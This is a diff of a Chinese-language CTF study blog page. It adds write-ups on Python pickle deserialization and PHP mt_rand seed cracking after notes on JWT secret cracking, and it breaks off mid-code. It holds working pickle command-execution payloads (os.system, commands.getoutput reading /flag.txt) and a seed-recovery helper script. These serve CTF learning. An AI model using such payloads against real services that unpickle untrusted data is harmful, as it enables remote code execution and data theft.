@@ -30,8 +30,18 @@
 <meta property="og:image" content="http://example.com/images/JBFBSKZY4FWH5KWZ7KC.png">
 <meta property="og:image" content="http://example.com/images/YUHH2KYYY0T1NMKK4Q.png">
 <meta property="og:image" content="http://example.com/images/ECFP2LKJ1JB7QPI9LO8.png">
+<meta property="og:image" content="http://example.com/images/2019111919425656.png">
+<meta property="og:image" content="http://example.com/images/20191119201217782.png">
+<meta property="og:image" content="http://example.com/images/1602833766_5f894d6645918cb160946.png">
+<meta property="og:image" content="http://example.com/images/1602833783_5f894d77193428c9650af.jpg">
+<meta property="og:image" content="http://example.com/images/N37JFREFOZRT5HKIU.png">
+<meta property="og:image" content="http://example.com/images/JN7XR4QJ48H7LL1I58.png">
+<meta property="og:image" content="http://example.com/images/UEGFLJDLTAGX3D9N.png">
+<meta property="og:image" content="http://example.com/images/BHD9I0PD4MM8RB49POT.png">
+<meta property="og:image" content="http://example.com/images/Z4G7O5TWL8KY09.png">
+<meta property="og:image" content="http://example.com/images/L7EBWVPZMJ2KLWYNUOI.png">
 <meta property="article:published_time" content="2023-01-25T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-15T16:13:59.416Z">
+<meta property="article:modified_time" content="2024-02-22T10:50:12.090Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/874963-20180709124807031-664967381.png">
@@ -244,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          7.9k 字
         
       </span>
     
@@ -255,7 +265,7 @@
         
         
         
-          12 分钟
+          66 分钟
         
       </span>
     
@@ -341,6 +351,140 @@
 <p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个密钥，签名算法是header中指定的那个，然后对它们签名即可。<br>例如</p>
 <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">HMACSHA256(<span class="hljs-params">base64UrlEncode</span>(<span class="hljs-params">header</span>)</span> + <span class="hljs-string">&quot;.&quot;</span> + base64<span class="hljs-constructor">UrlEncode(<span class="hljs-params">payload</span>)</span>, secret)<br></code></pre></td></tr></table></figure>
 <p>签名是用于验证消息在传递过程中有没有被更改，并且，由于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。<br>官网解码图<br><img src="/images/874963-20180707150229764-2037235703.png" srcset="/img/loading.gif" lazyload><br>官网地址<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a><br>密钥的取得方法我们由一个题来引入<br><strong>[CISCN2019 华北赛区 Day1 Web2]ikun</strong><br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png" srcset="/img/loading.gif" lazyload><br>从cookies中抓出JWT数据<br>放到官网里分析<br><img src="/images/YUHH2KYYY0T1NMKK4Q.png" srcset="/img/loading.gif" lazyload><br>是我们注册的数据没错<br>现在要做的就是破解密钥<br>这里有个脚本<a target="_blank" rel="noopener" href="https://gitcode.com/mirrors/brendan-rius/c-jwt-cracker/overview">c-jwt-cracker</a><br>我使用的是kali，攻击jwt<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png" srcset="/img/loading.gif" lazyload><br>这样我们就获得了我们的密钥，然后将密钥填入密匙位置在官网生成一个新的JWT<br><a target="_blank" rel="noopener" href="https://zijie.love/2023/12/20/buuctf_web/#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web2-ikun">原题链接</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT</a></p>
+<h1 id="Python-Pickle反序列化漏洞"><a href="#Python-Pickle反序列化漏洞" class="headerlink" title="Python Pickle反序列化漏洞"></a>Python Pickle反序列化漏洞</h1><h2 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h2><ul>
+<li><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</p>
+</li>
+<li><p>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</p>
+</li>
+<li><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是python专用的；pickle能表示python几乎所有的类型(包括自定义类型)，json只能表示一部分内置类型且不能表示自定义类型。</p>
+</li>
+<li><p>pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到(pickle解析能力大于pickle生成能力)。</p>
+</li>
+</ul>
+<ol>
+<li>dump和load与文件操作结合起来：</li>
+</ol>
+<ul>
+<li>序列化</li>
+</ul>
+ <figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">pickle.dump(obj, <span class="hljs-keyword">file</span>, protocol=<span class="hljs-keyword">None</span>,)<br></code></pre></td></tr></table></figure>
+
+<p>必填参数obj表示将要封装的对象，必填参数file表示obj要写入的文件对象，file必须以二进制可写模式打开，即wb。</p>
+<ul>
+<li>反序列化</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pickle.load(file,*,<span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>必填参数file必须以二进制可读模式打开，即rb，其他都为可选参数。</p>
+<p>示例：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">data</span> = [<span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;cc&#x27;</span>]<br><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./test.pkl&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    pickle.dump(<span class="hljs-keyword">data</span>, f)<br><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./test.pkl&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> ff:<br>    d = pickle.load(ff)<br><br>print(d)<br># [<span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;cc&#x27;</span>]<br><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>dumps与loads则不需要输出成文件，而是以字符串(py2)或字节流(py3)的形式进行转换。</li>
+</ol>
+<ul>
+<li>序列化</li>
+</ul>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pickle.dumps<span class="hljs-comment">(obj)</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>反序列化</li>
+</ul>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">pickle.loads(bytes<span class="hljs-number">_</span><span class="hljs-keyword">object</span>)<br></code></pre></td></tr></table></figure>
+
+<p>示例</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># python3</span><br>import pickle<br><br>data = [<span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;cc&#x27;</span>]<br>p = pickle.dumps(data)<br><span class="hljs-built_in">print</span>(p)<br><br>d = pickle.loads(p)<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure>
+
+<p>output</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">03</span>]q\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>(X\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>aaq\<span class="hljs-keyword">x</span><span class="hljs-number">01</span>X\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>bbq\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>X\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>ccq\<span class="hljs-keyword">x</span><span class="hljs-number">03</span>e.&#x27;  <br><br>[&#x27;aa&#x27;<span class="hljs-punctuation">,</span> &#x27;bb&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-keyword">cc</span>&#x27;]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># python2</span><br>import pickle<br><br>data = [<span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;cc&#x27;</span>]<br>p = pickle.dumps(data)<br><span class="hljs-built_in">print</span> p<br>d = pickle.loads(p)<br><span class="hljs-built_in">print</span> d<br><br></code></pre></td></tr></table></figure>
+<p>output</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">lp0</span><br>S<span class="hljs-symbol">&#x27;aa</span>&#x27;<br>p1<br>aS<span class="hljs-symbol">&#x27;bb</span>&#x27;<br>p2<br>aS<span class="hljs-symbol">&#x27;cc</span>&#x27;<br>p3<br>a.<br><br>[<span class="hljs-symbol">&#x27;aa</span>&#x27;, <span class="hljs-symbol">&#x27;bb</span>&#x27;, <span class="hljs-symbol">&#x27;cc</span>&#x27;]<br></code></pre></td></tr></table></figure>
+
+<h2 id="PVM操作码"><a href="#PVM操作码" class="headerlink" title="PVM操作码"></a>PVM操作码</h2><p>要想真正的利用反序列化，我们还得从底层了解一下pickle数据的格式是什么样的。</p>
+<ul>
+<li><p>c: 读取新的一行作为模板名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。</p>
+</li>
+<li><p><code>(</code> :将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</p>
+</li>
+<li><p>t: 从堆栈中弹出对象，知道一个<code>(</code>被弹出，并创建一个包含弹出对象(除了<code>(</code>)的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</p>
+</li>
+<li><p>S: 读取引号中的字符串直到换行符处，然后将它压入堆栈。</p>
+</li>
+<li><p>R: 将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象。最后将结果压入到堆栈中。</p>
+</li>
+<li><p><code>.</code> :结束pickle</p>
+</li>
+</ul>
+<p>简单说来就是：</p>
+<ul>
+<li><p>c: 以c开始的后面两行的作用类似os.system的调用，其中cos在第一行，system在第二行。</p>
+</li>
+<li><p><code>(</code>: 相当于左括号</p>
+</li>
+<li><p>t: 相当于右括号</p>
+</li>
+<li><p>S: 表示本行的内容一个字符串</p>
+</li>
+<li><p>R: 执行紧靠自己左边的一个括号对(即<code>(</code>和t之间)的内容</p>
+</li>
+<li><p><code>.</code>: 代表该pickle结束</p>
+</li>
+</ul>
+<p>举一个例子：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-built_in">cos</span><br><span class="hljs-keyword">system</span><br>(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure>
+<p>我们将上面的序列化字符串在python2下反序列化，相当于执行了os.system(‘whoami’)</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"># python2<br><span class="hljs-keyword">import</span> pickle<br>s <span class="hljs-operator">=</span><span class="hljs-string">&quot;cos<span class="hljs-subst">\n</span>system<span class="hljs-subst">\n</span>(S&#x27;whoami&#x27;<span class="hljs-subst">\n</span>tR.&quot;</span><br>pickle.loads(s)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2019111919425656.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="反序列化漏洞利用"><a href="#反序列化漏洞利用" class="headerlink" title="反序列化漏洞利用"></a>反序列化漏洞利用</h2><p>python中的类有一个__reduce__方法，类似与PHP中的wakeup，在反序列化的时候会自动调用。</p>
+<p>这里注意，在python2中只有内置类才有__reduce__方法，即用class A(object)声明的类，而python3中已经默认都是内置类了</p>
+<p>而我们定义的__reduce__可以返回一个元组，这个元组包含2到5个元素，主要用到前两个参数，即一个可调用的对象，用于重建对象时调用，一个参数元素(也是元组形式)，供那个可调用对象使用</p>
+<p>举个例子</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">A</span>(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        return (<span class="hljs-title">os</span>.<span class="hljs-title">system</span>,(&#x27;<span class="hljs-title">ls&#x27;</span>,))</span><br><span class="hljs-class">a = <span class="hljs-type">A</span>()</span><br><span class="hljs-class">test = pickle.dumps(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">pickle.loads(<span class="hljs-title">test</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/20191119201217782.png" srcset="/img/loading.gif" lazyload><br>成功执行命令</p>
+<p>看一下真题<br><strong>[CISCN2019 华北赛区 Day1 Web2]ikun</strong><br>前面的步骤就不再详细描述了，这里直接从Pickle反序列化漏洞入手<br>在admin.py中找到后门<br><img src="/images/1602833766_5f894d6645918cb160946.png" srcset="/img/loading.gif" lazyload><br>self.render(‘form.html’, res&#x3D;p, member&#x3D;1)<br>这段代码的意思就是找到模板文件，进行渲染，从而显示页面<br>来观察一下form.html页面<br><img src="/images/1602833783_5f894d77193428c9650af.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>说明传入的是可以直接进行回显的，而且可以将自定义的类进行序列化个反序列化。因此存在Pickle反序列化漏洞，那我们就可以构造一个通过pickle.dumps序列化的payload，从而被解析读取flag或其他信息。<br>构造payload可以使用方法__reduce__(self)，先要获取的flag文件的位置，然后进行读取<br>但需要注意几点：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">#<span class="hljs-built_in">os</span>.system和<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span> <br><span class="hljs-built_in">os</span>.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是<span class="hljs-number">0</span><br><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>() 无法读取程序执行的返回值<br></code></pre></td></tr></table></figure>
+<p>这两个函数只有以print输出时才会回显，如果是以return返回的就不会显示结果。<br>查阅资料发现<br><img src="/images/N37JFREFOZRT5HKIU.png" srcset="/img/loading.gif" lazyload><br>可以使用commands.getoutput()这个函数来进行代替，构造payload</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel"># coding=utf8<br>import pickle<br>import urllib<br>import commands<br><br>class payload(object):<br>    def __reduce__(self):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>a = payload()<br><span class="hljs-keyword">print</span> urllib.quote(pickle.dumps(a))<br>#ccommands%0Agetoutput%0Ap0%0A%28S%27ls%20/%27%0Ap1%0Atp2%0ARp3%0A.<br></code></pre></td></tr></table></figure>
+<p><img src="/images/JN7XR4QJ48H7LL1I58.png" srcset="/img/loading.gif" lazyload><br>发现flag.txt文件，接下来读取即可</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>,))<br></code></pre></td></tr></table></figure>
+
+<p>参考 ：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252189.html">Python Pickle反序列化漏洞</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jefree/p/4461979.html">os.system() 和 os.popen() </a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/103143526?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.channel_param">浅谈python反序列化漏洞</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjiDCDRlCDcno3D&alichlgref=https://xz.aliyun.com/t/7436#toc-5">pickle反序列化初探</a></p>
+<h1 id="php伪随机数mt-rand函数漏洞"><a href="#php伪随机数mt-rand函数漏洞" class="headerlink" title="php伪随机数mt_rand函数漏洞"></a>php伪随机数mt_rand函数漏洞</h1><p><strong>mt_rand()函数</strong></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mt_rand</span>()函数使用Mersenne Twister 算法生成随机整数。<br>使用语法：<span class="hljs-built_in">mt_rand</span>();or <span class="hljs-built_in">mt_rand</span>(min,max); 生成一个区间内的随机数。<br>其参数min默认为最小值<span class="hljs-number">0</span>，max默认为可生成的随机数最大值<span class="hljs-number">2147483647</span>，由<span class="hljs-built_in">mt_getrandmax</span>()函数获得。<br></code></pre></td></tr></table></figure>
+
+<p><strong>mt_srand()函数</strong></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mt_srand</span>()函数播种Mersenne Twister 随机数生成器。(播种我理解为以这个值开始向上随机)<br>提示：从PHP <span class="hljs-number">4.2</span><span class="hljs-selector-class">.0</span>开始，随机数生成器自动播种，因此没有必要使用该函数。<br>当不使用随机数播种函数srand时，php也会自动为随机数播种，<br>因此是否确定种子都不会影响正常运行。<br></code></pre></td></tr></table></figure>
+
+<p>在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。(播种为mt_srand()函数完成),当随机种子生成后，后面生成的随机数就会根据这个随机种子生成。<strong>所以同一个种子下，随机数的生成是相同的，这就是漏洞点</strong>，看一个例子就懂了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;分割线___________&lt;br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br></code></pre></td></tr></table></figure>
+<p>在上面的代码中，我们把随机数播种为0，每次运行都会获得相同的序列，这就是伪随机：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1178568022</span><br><span class="hljs-number">1273124119</span><br><span class="hljs-number">1535857466</span><br>分割线___________<br><span class="hljs-number">1178568022</span><br><span class="hljs-number">1273124119</span><br><span class="hljs-number">1535857466</span><br></code></pre></td></tr></table></figure>
+
+<p>因此在知晓一串随机序列的条件下，基于序列相同的seed爆破是可能实现的。</p>
+<p>在对seed进行爆破，我们需要使用一个工具<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a></p>
+<h2 id="php-mt-seed工具使用"><a href="#php-mt-seed工具使用" class="headerlink" title="php_mt_seed工具使用"></a>php_mt_seed工具使用</h2><p>php_mt_seed是c语言编写的爆破随机数序列种子的工具，<br>github地址为：<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a><br>我在这里使用的环境为kali系统<br>下载完成后，进入下载目录中运行make命令<br><img src="/images/UEGFLJDLTAGX3D9N.png" srcset="/img/loading.gif" lazyload></p>
+<p>程序编译完成后，使用官方文档中的使用方法<br><img src="/images/BHD9I0PD4MM8RB49POT.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&#x27;</span>;<br>   <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br>   <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>];<br>   <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span>  &quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>将我们的序列转换为php_mt_seed可识别的格式</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">php php文件<span class="hljs-string">.php</span> 待爆破字符<br></code></pre></td></tr></table></figure>
+
+<p>后使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./php_mt_rand 爆破出的序列值<br></code></pre></td></tr></table></figure>
+<p>即可得出seed值<br>下面看一道真题<br><strong>[GWCTF 2019]枯燥的抽奖</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span 